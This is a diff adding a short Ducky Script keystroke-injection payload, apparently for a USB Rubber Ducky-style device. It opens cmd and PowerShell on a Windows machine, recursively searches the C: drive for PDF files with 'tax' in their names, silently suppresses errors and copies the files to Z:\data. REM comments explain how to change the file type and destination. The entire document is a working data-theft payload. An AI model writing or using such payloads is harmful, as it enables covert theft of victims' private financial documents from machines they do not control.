@@ -1,0 +1,18 @@
+DEFAULTDELAY 10
+DELAY 5000
+GUI r
+DELAY 50
+STRING cmd
+DELAY 50
+ENTER
+REM copy files with names containting tax
+DELAY 250
+STRING powershell
+REM may have to change " to @ 
+STRING  " Get-ChildItem -Path C:\ 
+REM change type after -Include 
+STRING  -Recurse -Include *tax*.pdf -erroraction silentlycontinue -force
+REM file location
+STRING  | copy-item -destination Z:\data -force -container 
+ENTER
+
